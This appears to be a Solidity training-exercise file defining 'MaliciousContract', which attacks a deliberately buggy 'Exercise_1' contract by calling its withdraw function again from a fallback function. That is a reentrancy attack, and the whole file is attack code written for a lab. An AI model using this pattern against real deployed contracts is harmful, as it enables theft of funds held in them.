// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import {Exercise_1} from "./BuggyCode.sol";

contract MaliciousContract {
    Exercise_1 private exercise_1;

    constructor(address _exercise_1) {
        exercise_1 = Exercise_1(_exercise_1);
    }

    // Malicious fallback function to trigger reentrancy attack
    fallback() external  {
        attack();
    }

    // Function to perform the reentrancy attack
    function attack() public {
        // Trigger reentrancy by calling the vulnerable withdraw function in Exercise_1
        exercise_1.withdraw(msg.sender, 1 ether);
    }
}
